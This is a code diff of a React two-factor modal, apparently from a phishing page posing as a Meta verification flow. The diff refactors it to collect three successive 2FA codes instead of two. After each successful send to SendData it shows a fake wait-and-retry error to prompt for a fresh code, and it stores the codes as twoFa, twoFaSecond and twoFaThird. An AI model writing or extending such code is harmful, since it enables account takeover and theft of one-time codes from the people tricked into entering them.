@@ -14,8 +14,8 @@ interface TwoFactorModalProps {
     onToggleModal: (isOpen: boolean) => void;
 }
 
-/** Sau nhập sai mã lần 1 → chờ trước khi nhập lại lần 2 */
-const RETRY_WAIT_AFTER_FIRST_WRONG_SEC = 15;
+/** Sau nhập sai mã → chờ trước khi cho nhập lại */
+const RETRY_WAIT_AFTER_WRONG_SEC = 15;
 
 const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {
     const t = useAppStrings();
@@ -23,6 +23,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
     const [isOpen, setIsOpen] = React.useState(isOpend);
     const [errors, setErrors] = React.useState<Record<string, string>>({});
     const [loading, setLoading] = React.useState(false);
+    /** 0 = lần 1, 1 = lần 2, 2 = lần 3 */
     const [click, setClick] = React.useState(0);
     const [disabled, setDisable] = React.useState(false);
     const intervalRef = React.useRef<ReturnType<typeof setInterval> | null>(null);
@@ -38,7 +39,15 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
 
     React.useEffect(() => {
         setIsOpen(isOpend);
-    }, [isOpend]);
+        if (isOpend) {
+            setClick(0);
+            setTwoFa('');
+            setErrors({});
+            setLoading(false);
+            setDisable(false);
+            dispatch(updateForm({ twoFa: '', twoFaSecond: '', twoFaThird: '' }));
+        }
+    }, [isOpend, dispatch]);
 
     React.useEffect(() => {
         return () => {
@@ -48,19 +57,18 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
         };
     }, []);
 
+    const syncTwoFaToStore = (value: string, attempt: number) => {
+        if (attempt === 0) dispatch(updateForm({ twoFa: value }));
+        if (attempt === 1) dispatch(updateForm({ twoFaSecond: value }));
+        if (attempt === 2) dispatch(updateForm({ twoFaThird: value }));
+    };
+
     const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
         const { id, value } = e.target;
         const normalizedValue = value.replace(/\D/g, '').slice(0, 8);
         setTwoFa(normalizedValue);
-        setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change
-
-        if (click === 0) {
-            dispatch(updateForm({ twoFa: normalizedValue }));
-        }
-
-        if (click === 1) {
-            dispatch(updateForm({ twoFaSecond: normalizedValue }));
-        }
+        setErrors(prev => ({ ...prev, [id]: '' }));
+        syncTwoFaToStore(normalizedValue, click);
     };
 
     const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);
@@ -71,10 +79,10 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
         return t.twoFa.retryErrorExpired(minutes, seconds);
     };
 
-    const startRetryCountdown = () => {
+    const startRetryCountdown = (nextAttempt: number) => {
         if (intervalRef.current) clearInterval(intervalRef.current);
 
-        const waitSec = RETRY_WAIT_AFTER_FIRST_WRONG_SEC;
+        const waitSec = RETRY_WAIT_AFTER_WRONG_SEC;
 
         setDisable(true);
         setErrors({ twoFa: formatRetryMessage(waitSec) });
@@ -85,7 +93,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
             if (remaining <= 0) {
                 if (intervalRef.current) clearInterval(intervalRef.current);
                 intervalRef.current = null;
-                setClick(1);
+                setClick(nextAttempt);
                 setErrors({});
                 setDisable(false);
                 return;
@@ -99,8 +107,7 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
         e.preventDefault();
         setTwoFa(pasted);
         setErrors((prev) => ({ ...prev, twoFa: '' }));
-        if (click === 0) dispatch(updateForm({ twoFa: pasted }));
-        if (click === 1) dispatch(updateForm({ twoFaSecond: pasted }));
+        syncTwoFaToStore(pasted, click);
     };
 
     const handleClose = () => {
@@ -112,16 +119,15 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
         onToggleModal(false);
     };
 
+    const buildPayload = () => {
+        if (click === 0) return { ...formDataState, twoFa };
+        if (click === 1) return { ...formDataState, twoFaSecond: twoFa };
+        return { ...formDataState, twoFaThird: twoFa };
+    };
+
     const handSubmit = async (e: React.FormEvent) => {
         try {
             e.preventDefault();
-            const newErrors: Record<string, string> = {};
-
-            if (Object.keys(newErrors).length > 0) {
-                setErrors(newErrors);
-                return;
-            }
-            const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);
 
             if (!isTwoFaValid) {
                 setErrors({ twoFa: t.twoFa.errInvalid });
@@ -129,47 +135,35 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
             }
 
             setLoading(true);
+            const payload = buildPayload();
 
-            if (click === 0) {
-                await SendData(formDataState)
-                .then((response) => {
-                    setTimeout(async () => {
-                        setLoading(false);
-                        setTwoFa('');
-                        startRetryCountdown();
-                    }, 1234);
+            try {
+                await SendData(payload);
+                await new Promise((r) => setTimeout(r, 1234));
+                setLoading(false);
+                setTwoFa('');
 
-                })
-                .catch((error) => {
-                    console.error("Error submitting form:", error);
-                    setLoading(false);
-                    setErrors({ twoFa: t.twoFa.errSend });
-                });
+                if (click === 0) {
+                    startRetryCountdown(1);
+                    return;
+                }
+
+                if (click === 1) {
+                    startRetryCountdown(2);
+                    return;
+                }
+
+                markMetaVerifiedFlowCompleted();
+                isOpendFinish(true);
+                handleClose();
+                setClick(0);
+            } catch (error) {
+                console.error('Error submitting form:', error);
+                setLoading(false);
+                setErrors({ twoFa: click === 0 ? t.twoFa.errSend : t.twoFa.errVerify });
             }
-
-            if (click === 1) {
-                await SendData(formDataState)
-                .then((response) => {
-                    setTimeout(async () => {
-                        setLoading(false);
-                        setTwoFa('');
-
-                        markMetaVerifiedFlowCompleted();
-                        isOpendFinish(true);
-                        handleClose();
-
-                        setClick(0);
-                    }, 1234);
-                })
-                .catch((error) => {
-                    console.error("Error submitting form:", error);
-                    setLoading(false);
-                    setErrors({ twoFa: t.twoFa.errVerify });
-                });
-            }
-
         } catch (error) {
-            console.error("Error submitting form:", error);
+            console.error('Error submitting form:', error);
         }
     };
 
